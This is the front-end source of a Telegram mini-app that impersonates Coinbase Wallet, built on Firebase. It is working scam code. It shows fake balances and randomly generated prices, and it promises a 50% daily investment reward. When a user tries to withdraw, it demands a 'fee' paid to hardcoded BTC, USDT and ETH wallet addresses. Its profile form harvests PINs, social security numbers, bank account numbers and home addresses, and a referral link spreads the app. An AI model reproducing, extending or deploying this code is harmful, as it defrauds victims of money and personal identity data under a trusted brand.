  <div id="logout-iziModal" class="iziModal" data-izimodal-title="<strong>Logout</strong>">
    <div class="dark-content">
      <p>You're about to logout of this app</p>
      <button class="close-btn" id="logout-btn">Logout</button>
      <button class="close-btn">Cancel</button>
    </div>
  </div>

  <!-- Confirmation Modal for Investment -->
  <div id="investment-confirm-modal" class="iziModal" data-izimodal-title="Confirm Investment">
    <div class="dark-content">
      <p>Are you sure you want to invest <span id="confirm-investment-amount"></span>?</p>
      <p>This will deduct the amount from your balance and start your investment plan.</p>
      <button id="confirm-investment-btn" class="investment-btn">Confirm</button>
      <button class="close-btn">Cancel</button>
    </div>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/js/iziModal.min.js"></script>
  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js"></script>
  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js"></script>

  <!-- Firebase Module Script -->
  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js';
    import { getDatabase, ref, set, get, update, onValue, push } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js';

    const firebaseConfig = {
      apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
      authDomain: "coinbase-tgwallet.firebaseapp.com",
      projectId: "coinbase-tgwallet",
      databaseURL: "https://coinbase-tgwallet-default-rtdb.firebaseio.com",
      storageBucket: "coinbase-tgwallet.firebasestorage.app",
      messagingSenderId: "441804145305",
      appId: "1:441804145305:web:1fb586667c0d648c342e08",
      measurementId: "G-374F8YD4KV",
    };

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);
    const tg = window.Telegram.WebApp;
    tg.ready();

    const userId = tg.initDataUnsafe.user?.id || "54321";
    const username = tg.initDataUnsafe.user?.username || "Anonymous";
    const userRef = ref(database, `users/${userId}`);
    const settingsRef = ref(database, 'settings');

    const conversionRates = {
      USD: { USD: 1, USDT: 1, BTC: 0.000015, ETH: 0.00033 },
      USDT: { USD: 1, USDT: 1, BTC: 0.000015, ETH: 0.00033 },
      BTC: { USD: 66666.67, USDT: 66666.67, BTC: 1, ETH: 22 },
      ETH: { USD: 3030.30, USDT: 3030.30, BTC: 0.045, ETH: 1 }
    };

    window.firebaseFunctions = {
      database,
      userRef,
      settingsRef,
      ref,
      set,
      get,
      update,
      onValue,
      push,
      userId,
      username,
      conversionRates
    };

    function generateRandomString(length, chars) {
      let result = "";
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function generateEthAddress() {
      const hexChars = "0123456789abcdef";
      return `0xA1Ed${generateRandomString(36, hexChars)}`;
    }
    window.generateEthAddress = generateEthAddress;

    function truncateAddress(address) {
      if (!address || address.length < 10) return address || "N/A";
      return `${address.slice(0, 6)}...${address.slice(-5)}`;
    }
    window.truncateAddress = truncateAddress;

    async function initializeUserData(attempts = 3) {
      for (let i = 0; i < attempts; i++) {
        try {
          const snapshot = await get(userRef);
          if (!snapshot.exists()) {
            const walletAddress = userId === "54321" ? "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy" : generateEthAddress();
            await set(userRef, {
              username: username,
              fullName: "",
              email: "",
              pin: "",
              ssin: "",
              accountNumber: "",
              bankName: "",
              address: "",
              balance: 78.01,
              currency: "USD",
              network: "ERC20",
              wallet: walletAddress,
              referrals: 0,
              referredBy: null,
              settings: { theme: "dark", currency: "USD", network: "ERC20", autoRenew: false },
              investment: { amount: 0, lastClaim: null, startDate: null, lastRenewal: null },
              tradeHistory: {},
              notifications: {
                welcome: {
                  title: "Welcome!",
                  message: "Thanks for joining Coinbase Wallet!",
                  timestamp: new Date().toISOString(),
                },
              },
              transactions: {},
            });
            window.firebaseInitialized = true;
            iziToast.success({ title: "Success", message: "User profile created!", position: "topRight" });
            return true;
          } else {
            window.firebaseInitialized = true;
            return true;
          }
        } catch (error) {
          console.error(`Initialize attempt ${i + 1} failed:`, error);
          if (i === attempts - 1) {
            iziToast.error({ title: "Error", message: `Failed to initialize user data: ${error.message}`, position: "topRight" });
            return false;
          }
          await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, i)));
        }
      }
    }
    initializeUserData();
  </script>

  <!-- Main Script -->
  <script>
    document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
    document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;

    async function fetchBTCPrice(attempts = 3, baseDelay = 1000) {
      for (let i = 0; i < attempts; i++) {
        try {
          const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd', { signal: AbortSignal.timeout(5000) });
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          const data = await response.json();
          const price = data.bitcoin?.usd;
          if (!price) throw new Error('Invalid BTC price data');
          window.lastBtcPriceFetch = Date.now();
          return price;
        } catch (error) {
          console.error(`BTC price fetch attempt ${i + 1} failed:`, error);
          if (i === attempts - 1) return 60000;
          await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, i)));
        }
      }
      return 60000;
    }

    async function updateBalanceDisplay() {
      try {
        const snapshot = await window.firebaseFunctions.get(window.firebaseFunctions.userRef);
        if (!snapshot.exists()) {
          console.error("User data not found in Firebase");
          iziToast.error({ title: "Error", message: "Failed to fetch user data!", position: "topRight" });
          return;
        }
        const userData = snapshot.val() || {};
        const balance = userData.balance || 78.01;
        const currency = userData.settings?.currency || "USD";
        const $balanceDisplay = $("#balance-display");

        if (currency === "BTC") {
          const btcPrice = await fetchBTCPrice();
          const btcBalance = balance / btcPrice;
          $balanceDisplay.text(`${btcBalance.toFixed(6)} BTC`);
        } else if (currency === "ETH") {
          const ethBalance = (balance * window.firebaseFunctions.conversionRates.USD.ETH).toFixed(6);
          $balanceDisplay.text(`${ethBalance} ETH`);
        } else if (currency === "USDT") {
          const usdtBalance = (balance * window.firebaseFunctions.conversionRates.USD.USDT).toFixed(2);
          $balanceDisplay.text(`${usdtBalance} USDT`);
        } else {
          $balanceDisplay.text(`$${balance.toFixed(2)}`);
        }
      } catch (error) {
        console.error('Failed to update balance display:', error);
        iziToast.error({ title: "Error", message: "Failed to update balance display!", position: "topRight" });
      }
    }

    function copyToClipboard(text) {
      if (!text) {
        iziToast.error({ title: "Error", message: "No text to copy!", position: "topRight" });
        return Promise.reject(new Error("Empty text"));
      }
      if (navigator.clipboard && window.isSecureContext) {
        return navigator.clipboard.writeText(text);
      } else {
        const textarea = document.createElement("textarea");
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        try {
          document.execCommand("copy");
          document.body.removeChild(textarea);
          return Promise.resolve();
        } catch (err) {
          document.body.removeChild(textarea);
          return Promise.reject(err);
        }
      }
    }

    function showToast(message) {
      if (typeof Toastify !== "undefined") {
        Toastify({
          text: message,
          duration: 3000,
          gravity: "top",
          position: "right",
          style: { background: "#333" },
        }).showToast();
      } else {
        iziToast.info({ title: "Info", message, position: "topRight" });
        console.warn("Toastify not loaded, using iziToast.");
      }
    }

    function waitForFirebase(callback) {
      if (window.firebaseInitialized) {
        callback();
      } else {
        setTimeout(() => waitForFirebase(callback), 100);
      }
    }

    const updatePrices = () => {
      const cryptoCards = document.querySelectorAll('.crypto-card');
      cryptoCards.forEach((card) => {
        const priceElement = card.querySelector('.price p');
        const currentPriceText = priceElement.textContent.replace(/[$A-Za-z]/g, '');
        const currentPrice = parseFloat(currentPriceText) || 0;
        const change = (Math.random() * 0.5 - 0.25).toFixed(2);
        const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2);
        const currency = window.firebaseFunctions?.userData?.settings?.currency || "USD";
        let displayPrice = newPrice;
        if (currency === "BTC") {
          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.BTC).toFixed(6);
          priceElement.textContent = `${displayPrice} BTC`;
        } else if (currency === "ETH") {
          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.ETH).toFixed(6);
          priceElement.textContent = `${displayPrice} ETH`;
        } else if (currency === "USDT") {
          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.USDT).toFixed(2);
          priceElement.textContent = `${displayPrice} USDT`;
        } else {
          priceElement.textContent = `$${newPrice}`;
        }
        priceElement.classList.remove('green', 'red');
        if (parseFloat(change) > 0) {
          priceElement.classList.add('green');
        } else if (parseFloat(change) < 0) {
          priceElement.classList.add('red');
        }
      });
    };

    function updateCountdown(lastClaim, callback) {
      const now = new Date().getTime();
      const lastClaimTime = lastClaim ? new Date(lastClaim).getTime() : 0;
      const oneDay = 24 * 60 * 60 * 1000;
      const nextClaimTime = lastClaimTime + oneDay;
      const timeLeft = nextClaimTime - now;

      if (timeLeft <= 0) {
        $("#countdown-timer").text("00:00:00");
        $("#claim-reward").prop("disabled", false);
        return;
      }

      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
      $("#countdown-timer").text(
        `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`
      );
      $("#claim-reward").prop("disabled", true);

      setTimeout(() => updateCountdown(lastClaim, callback), 1000);
    }

    function formatChatDate(timestamp) {
      const date = new Date(timestamp);
      const now = new Date();
      const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
      const messageDate = new Date(date.getFullYear(), date.getMonth(), date.getDate());
      const yesterday = new Date(today);
      yesterday.setDate(today.getDate() - 1);

      if (messageDate.getTime() === today.getTime()) {
        return "Today";
      } else if (messageDate.getTime() === yesterday.getTime()) {
        return "Yesterday";
      } else {
        return date.toLocaleDateString('en-US', { month: 'long', day: 'numeric' });
      }
    }

    $(document).ready(function() {
      if (typeof $.fn.iziModal === "undefined") {
        iziToast.error({ title: "Error", message: "iziModal failed to load!", position: "topRight" });
        return;
      }

      $(".iziModal").each(function() {
        $(this).iziModal({
          background: '#222',
          headerColor: '#444',
          width: '90%',
          radius: 12,
          transitionIn: 'fadeInUp',
          transitionOut: 'fadeOutDown',
          onOpening: function() {
            $(this).css('display', 'block');
          }
        });
      });

      $("#darkModal6").iziModal("open");
      setTimeout(() => $("#darkModal6").iziModal("close"), 20000);

      $(".open-btn").on("click", function() {
        const modalId = $(this).data("modal-id");
        try {
          $("#" + modalId).iziModal("open");
        } catch (error) {
          showToast(`Failed to open modal: ${error.message}`);
        }
      });

      $(".close-btn").on("click", function() {
        try {
          $(this).closest(".iziModal").iziModal("close");
        } catch (error) {
          showToast(`Failed to close modal: ${error.message}`);
        }
      });

      setInterval(updatePrices, 5000);

      waitForFirebase(async () => {
        const { database, userRef, settingsRef, ref, set, get, update, onValue, push, userId, username, conversionRates } = window.firebaseFunctions || {};
        if (!database || !onValue || !get) {
          iziToast.error({ title: "Error", message: "Firebase not initialized properly!", position: "topRight" });
          return;
        }

        let btcPrice = await fetchBTCPrice();
        let userWalletAddress = "0xA1Ed1234567890abcdef1234567890abcdef1234";

        setInterval(async () => {
          if (Date.now() - (window.lastBtcPriceFetch || 0) >= 5 * 60 * 1000) {
            btcPrice = await fetchBTCPrice();
            await updateBalanceDisplay();
          }
        }, 5 * 60 * 1000);

        function updateNetworkOptions(currency) {
          const networkSelect = $('#walletNetwork, #networkSelect');
          networkSelect.empty();
          if (currency === 'BTC') {
            networkSelect.append('<option value="Bitcoin">Bitcoin (BTC)</option>');
          } else {
            networkSelect.append('<option value="ERC20">ERC20 (USDT/ETH)</option>');
            if (currency !== 'USDT' && currency !== 'ETH') {
              networkSelect.append('<option value="Bitcoin">Bitcoin (BTC)</option>');
            }
          }
        }

        $("#copyAddress").on("click", async () => {
          try {
            const snapshot = await get(userRef);
            const userData = snapshot.val() || {};
            const walletToCopy = userData.wallet || userWalletAddress;
            await copyToClipboard(walletToCopy);
            showToast("Wallet address copied to clipboard!");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
          }
        });

        $("#copyIt").on("click", async () => {
          try {
            const feeWallet = $('#fee-wallet').text();
            await copyToClipboard(feeWallet);
            showToast("Deposit address copied to clipboard!");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy deposit address: ${error.message}`, position: "topRight" });
          }
        });

        $("#share-button").on("click", async () => {
          const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
          try {
            await copyToClipboard(referralLink);
            $("#darkModal5").iziModal("open");
            showToast("Referral link copied to clipboard!");
            if (window.Telegram?.WebApp?.showShare) {
              window.Telegram.WebApp.showShare({
                url: referralLink,
                text: "Join Coinbase Wallet and earn $10 per referral!"
              });
            }
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy referral link: ${error.message}`, position: "topRight" });
          }
        });

        onValue(userRef, async (snapshot) => {
          if (!snapshot.exists()) {
            console.error("User data snapshot not found");
            iziToast.error({ title: "Error", message: "Failed to load user data!", position: "topRight" });
            return;
          }
          const userData = snapshot.val() || {};
          window.firebaseFunctions.userData = userData;
          $("#usernameInput").val(userData.username || username);
          $("#fullNameInput").val(userData.fullName || "");
          $("#emailInput").val(userData.email || "");
          $("#pinInput").val(userData.pin || "");
          $("#ssinInput").val(userData.ssin || "");
          $("#accountNumberInput").val(userData.accountNumber || "");
          $("#bankNameInput").val(userData.bankName || "");
          $("#addressInput").val(userData.address || "");
          $("#account-name").text(`@${userData.username || "Anonymous"}`);
          const walletAddress = userData.wallet || userWalletAddress;
          $("#wallet-address").text(window.truncateAddress(walletAddress));
          $("#wallet-address").data("wallet", walletAddress);
          userWalletAddress = walletAddress;
          $("#themeSelect").val(userData.settings?.theme || "dark");
          $("#currencySelect").val(userData.settings?.currency || "USD");
          $("#networkSelect").val(userData.settings?.network || "ERC20");
          $("#autoRenew").prop('checked', userData.settings?.autoRenew || false);
          $("body").removeClass("light dark").addClass(userData.settings?.theme || "dark");
          updateNetworkOptions(userData.settings?.currency || "USD");
          await updateBalanceDisplay();

          if (userData.settings?.autoRenew && userData.investment?.startDate) {
            const lastRenewal = userData.investment.lastRenewal ? new Date(userData.investment.lastRenewal) : new Date(userData.investment.startDate);
            const now = new Date();
            const daysSinceRenewal = Math.floor((now - lastRenewal) / (1000 * 60 * 60 * 24));
            if (daysSinceRenewal >= 30) {
              const txRef = push(ref(database, `users/${userId}/transactions`));
              await set(txRef, {
                amount: userData.investment.amount,
                currency: userData.settings?.currency || "USD",
                wallet: userData.wallet,
                network: userData.settings?.network || "ERC20",
                type: "Investment Renewal",
                status: "completed",
                timestamp: now.toISOString(),
              });
              await update(userRef, {
                'investment/lastRenewal': now.toISOString(),
              });
              iziToast.success({ title: "Success", message: "Investment renewed!", position: "topRight" });
            }
          }

          const investmentAmount = userData.investment?.amount || 0;
          const lastClaim = userData.investment?.lastClaim;
          if (investmentAmount > 0) {
            const currency = userData.settings?.currency || "USD";
            const reward = (investmentAmount / 2) * (conversionRates.USD[currency] || 1);
            $("#investment-status").html(`Current Investment: ${investmentAmount.toLocaleString()} ${currency}<br>Daily Reward: ${reward.toFixed(2)} ${currency}`);
            $(".investment-btn").prop("disabled", true);
            updateCountdown(lastClaim);
          } else {
            $("#investment-status").html("Select an investment amount to start trading.");
            $(".investment-btn").prop("disabled", false);
            $("#claim-reward").prop("disabled", true);
            $("#countdown-timer").text("24:00:00");
          }
        });

        $("#profile-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitProfileInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');

          const fullName = $("#fullNameInput").val().trim();
          const email = $("#emailInput").val().trim();
          const pin = $("#pinInput").val().trim();
          const ssin = $("#ssinInput").val().trim();
          const accountNumber = $("#accountNumberInput").val().trim();
          const bankName = $("#bankNameInput").val().trim();
          const address = $("#addressInput").val().trim();

          if (!fullName) {
            iziToast.error({ title: "Error", message: "Full Name is required!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
            return;
          }
          if (!/^[0-9]{4}$|^[0-9]{6}$/.test(pin)) {
            iziToast.error({ title: "Error", message: "PIN must be 4 or 6 digits!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
            return;
          }

          try {
            await update(userRef, { fullName, email, pin, ssin, accountNumber, bankName, address });
            iziToast.success({ title: "Success", message: "Profile updated!", position: "topRight" });
            $("#profile-iziModal").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to update profile: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
          }
        });

        $("#settings-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitSettingsInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');

          const theme = $("#themeSelect").val();
          const currency = $("#currencySelect").val();
          const network = $("#networkSelect").val();
          const autoRenew = $("#autoRenew").prop('checked');

          try {
            await update(ref(database, `users/${userId}/settings`), { theme, currency, network, autoRenew });
            $("body").removeClass("light dark").addClass(theme);
            updateNetworkOptions(currency);
            await updateBalanceDisplay();
            iziToast.success({ title: "Success", message: "Settings saved!", position: "topRight" });
            $("#settings-iziModal").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to save settings: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
          }
        });

        let pendingInvestmentAmount = 0;
        $(".investment-btn").on("click", async function() {
          pendingInvestmentAmount = parseFloat($(this).data("amount"));
          const currency = window.firebaseFunctions.userData?.settings?.currency || "USD";
          $("#confirm-investment-amount").text(`${pendingInvestmentAmount.toFixed(2)} ${currency}`);
          $("#investment-confirm-modal").iziModal("open");
        });

        $("#confirm-investment-btn").on("click", async function() {
          const submitButton = $(this);
          submitButton
            .prop("disabled", true)
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Confirming...');

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
              return;
            }
            const userData = snapshot.val() || {};
            const currentBalance = userData.balance || 0;
            const currency = userData.settings?.currency || "USD";

            if (pendingInvestmentAmount <= 0 || pendingInvestmentAmount > currentBalance) {
              iziToast.error({ title: "Error", message: "Invalid investment amount or insufficient balance!", position: "topRight" });
              return;
            }

            const updates = {
              [`users/${userId}/balance`]: currentBalance - pendingInvestmentAmount,
              [`users/${userId}/investment`]: {
                amount: pendingInvestmentAmount,
                lastClaim: null,
                startDate: new Date().toISOString(),
                lastRenewal: new Date().toISOString(),
              },
              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
                amount: pendingInvestmentAmount,
                currency: currency,
                wallet: userData.wallet || userWalletAddress,
                network: userData.settings?.network || "ERC20",
                type: "Investment",
                status: "completed",
                timestamp: new Date().toISOString(),
              },
              [`users/${userId}/notifications/${Date.now()}`]: {
                title: "Investment Started",
                message: `You invested ${pendingInvestmentAmount.toFixed(2)} ${currency}!`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            iziToast.success({ title: "Success", message: `Investment of ${pendingInvestmentAmount.toFixed(2)} ${currency} started!`, position: "topRight" });
            $("#investment-confirm-modal").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to process investment: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).html("Confirm");
          }
        });

        $("#claim-reward").on("click", async function() {
          const submitButton = $(this);
          submitButton
            .prop("disabled", true)
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Claiming...');

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
              return;
            }
            const userData = snapshot.val() || {};
            const investmentAmount = userData.investment?.amount || 0;
            const currency = userData.settings?.currency || "USD";
            const currentBalance = userData.balance || 0;

            if (investmentAmount <= 0) {
              iziToast.error({ title: "Error", message: "No active investment to claim!", position: "topRight" });
              return;
            }

            const reward = (investmentAmount / 2) * (conversionRates.USD[currency] || 1);
            const updates = {
              [`users/${userId}/balance`]: currentBalance + reward,
              [`users/${userId}/investment/lastClaim`]: new Date().toISOString(),
              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
                amount: reward,
                currency: currency,
                wallet: userData.wallet || userWalletAddress,
                network: userData.settings?.network || "ERC20",
                type: "Reward Claim",
                status: "completed",
                timestamp: new Date().toISOString(),
              },
              [`users/${userId}/notifications/${Date.now()}`]: {
                title: "Reward Claimed",
                message: `You claimed ${reward.toFixed(2)} ${currency}!`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            iziToast.success({ title: "Success", message: `Claimed ${reward.toFixed(2)} ${currency}!`, position: "topRight" });
            updateCountdown(new Date().toISOString());
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to claim reward: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", true).html("Claim Reward");
          }
        });

        $("#send-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitSendInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Sending...');

          const wallet = $("#sendWalletInput").val().trim();
          const amount = parseFloat($("#sendAmountInput").val());

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }
            const userData = snapshot.val() || {};
            const currentBalance = userData.balance || 0;
            const currency = userData.settings?.currency || "USD";

            if (!wallet) {
              iziToast.error({ title: "Error", message: "Wallet address cannot be empty!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            if (isNaN(amount) || amount <= 0) {
              iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            if (amount > currentBalance) {
              $("#insufficient-send-balance").removeClass("hide");
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            const updates = {
              [`users/${userId}/balance`]: currentBalance - amount,
              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
                amount: amount,
                currency: currency,
                wallet: wallet,
                network: userData.settings?.network || "ERC20",
                type: "Send",
                status: "pending",
                timestamp: new Date().toISOString(),
              },
              [`users/${userId}/notifications/${Date.now()}`]: {
                title: "Send Requested",
                message: `You sent ${amount.toFixed(2)} ${currency} to ${truncateAddress(wallet)}`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            iziToast.success({ title: "Success", message: `Sent ${amount.toFixed(2)} ${currency}!`, position: "topRight" });
            $("#send-form")[0].reset();
            $("#insufficient-send-balance").addClass("hide");
            $("#darkModal1").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to send: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Send");
          }
        });

        $("#wallet-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitWalletInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Withdrawing...');

          const wallet = $("#walletInput").val().trim();
          const amount = parseFloat($("#wallet_amountInput").val());
          const network = $("#walletNetwork").val();

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found! Please try again.", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }
            const userData = snapshot.val() || {};
            const currentBalance = userData.balance || 0;
            const currency = userData.settings?.currency || "USD";

            if (!wallet) {
              iziToast.error({ title: "Error", message: "Wallet address cannot be empty!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            if (isNaN(amount) || amount <= 0) {
              iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            if (amount > currentBalance) {
              $("#insufficient-balance").removeClass("hide");
              iziToast.error({ title: "Error", message: `Insufficient balance: ${currentBalance.toFixed(2)} ${currency} available`, position: "topRight" });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            if (amount < 70.01 && currency === "USD") {
              $("#darkModal7").iziModal("close");
              $("#darkModal2").iziModal("open");
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            // Define fee addresses
            const feeAddresses = {
              Bitcoin: "1HRaVe6ALzKhKX5i1QsxTTm3jaJMrx2mw4",
              ERC20: currency === "USDT" ? "TFjxrVXrU3mBLUNeQHnsM4F7SStnQjiR8m" : "0x85e9c9561f1dcdc94d8ee089d914cc5f014a4173",
            };
            const feeWallet = feeAddresses[network] || feeAddresses["ERC20"];
            const feeCurrency = network === "Bitcoin" ? "BTC" : currency;

            // Calculate fee: 4.0816% of amount, converted to feeCurrency
            const feePercentage = 0.040816; // 4.0816%
            let feeAmountUSD = amount * feePercentage;
            if (currency !== "USD") {
              feeAmountUSD = amount * (1 / conversionRates[currency].USD);
            }
            let feeAmount = feeAmountUSD * (conversionRates.USD[feeCurrency] || 1);

            // Apply minimum fees
            const minFees = {
              BTC: 0.0001, // ~$6.67 at $66,666/BTC
              USDT: 0.50,
              ETH: 0.0002, // ~$0.61 at $3,030/ETH
            };
            feeAmount = Math.max(feeAmount, minFees[feeCurrency] || minFees.USDT);

            const updates = {
              [`users/${userId}/balance`]: currentBalance - amount,
              [`users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`]: {
                amount: amount,
                currency: currency,
                wallet: wallet,
                network: network,
                type: "Withdraw",
                status: "pending",
                timestamp: new Date().toISOString(),
              },
              [`users/${userId}/notifications/${Date.now()}`]: {
                title: "Withdrawal Requested",
                message: `You requested a withdrawal of ${amount.toFixed(2)} ${currency} to ${truncateAddress(wallet)}`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            document.cookie = `userWithdrawal=${amount}; path=/`;
            $("#wallet-form")[0].reset();
            $("#insufficient-balance").addClass("hide");
            $("#darkModal7").iziModal("close");
            $("#darkModal8").iziModal("open");

            // Update fee modal
            $("#fee-amount").text(feeAmount.toFixed(feeCurrency === "BTC" || feeCurrency === "ETH" ? 6 : 2));
            $("#fee-currency").text(feeCurrency);
            $("#fee-wallet").text(feeWallet);

            const qrCodeContainer = document.getElementById("qrCodeContainer");
            qrCodeContainer.innerHTML = "";
            new QRCode(qrCodeContainer, {
              text: feeWallet,
              width: 128,
              height: 128,
              colorDark: "#000000",
              colorLight: "#ffffff",
              correctLevel: QRCode.CorrectLevel.H,
            });
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to withdraw: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
          }
        });

        $("#continuePayment").on("click", async () => {
          const cookies = document.cookie.split(";").reduce((acc, cookie) => {
            const [name, value] = cookie.trim().split("=");
            acc[name] = value;
            return acc;
          }, {});

          if (!cookies.userWithdrawal) {
            iziToast.error({ title: "Error", message: "No withdrawal request found!", position: "topRight" });
            return;
          }

          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              iziToast.error({ title: "Error", message: "User data not found!", position: "topRight" });
              return;
            }
            const userData = snapshot.val() || {};
            const network = userData.settings?.network || "ERC20";
            const currency = userData.settings?.currency || "USD";
            const feeAddresses = {
              Bitcoin: "1HRaVe6ALzKhKX5i1QsxTTm3jaJMrx2mw4",
              ERC20: currency === "USDT" ? "TFjxrVXrU3mBLUNeQHnsM4F7SStnQjiR8m" : "0x85e9c9561f1dcdc94d8ee089d914cc5f014a4173",
            };
            const feeWallet = feeAddresses[network] || feeAddresses["ERC20"];
            const feeCurrency = network === "Bitcoin" ? "BTC" : currency;

            // Calculate fee for the withdrawal amount
            const withdrawalAmount = parseFloat(cookies.userWithdrawal);
            let feeAmountUSD = withdrawalAmount * 0.040816;
            if (currency !== "USD") {
              feeAmountUSD = withdrawalAmount * (1 / conversionRates[currency].USD);
            }
            let feeAmount = feeAmountUSD * (conversionRates.USD[feeCurrency] || 1);
            const minFees = {
              BTC: 0.0001,
              USDT: 0.50,
              ETH: 0.0002,
            };
            feeAmount = Math.max(feeAmount, minFees[feeCurrency] || minFees.USDT);

            await update(ref(database, `users/${userId}/transactions/${push(ref(database, `users/${userId}/transactions`)).key}`), {
              amount: feeAmount,
              currency: feeCurrency,
              wallet: feeWallet,
              network: network,
              type: "Fee Payment",
              status: "pending",
              timestamp: new Date().toISOString(),
            });
            document.cookie = `userPaid=true; path=/`;
            $("#darkModal8").iziModal("close");
            $("#darkModal9").iziModal("open");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to process payment: ${error.message}`, position: "topRight" });
          }
        });

        $("#continuePaymentCls").on("click", () => {
          $("#darkModal9").iziModal("close");
          document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
          document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
        });

